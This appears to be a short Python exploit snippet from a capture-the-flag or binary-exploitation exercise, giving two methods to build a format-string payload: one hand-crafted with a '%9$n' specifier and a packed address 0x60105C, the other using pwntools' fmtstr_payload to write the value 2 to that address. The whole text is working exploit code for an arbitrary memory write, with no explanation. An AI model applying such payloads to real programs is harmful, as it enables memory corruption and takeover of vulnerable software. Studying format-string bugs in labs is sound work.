# ============= METHOD 1 =============
numbwritten = 1
what = 0x2

p = b'a' * what
p += b'%9$n'
p = p.ljust(8, b'a')
p += b'a' * numbwritten
p += p64(0x60105C)
print(p)
# ====================================

# ============= METHOD 2 =============
p = b'a' + fmtstr_payload(8, {0x60105c: 0x2}, numbwritten=1)
# ====================================
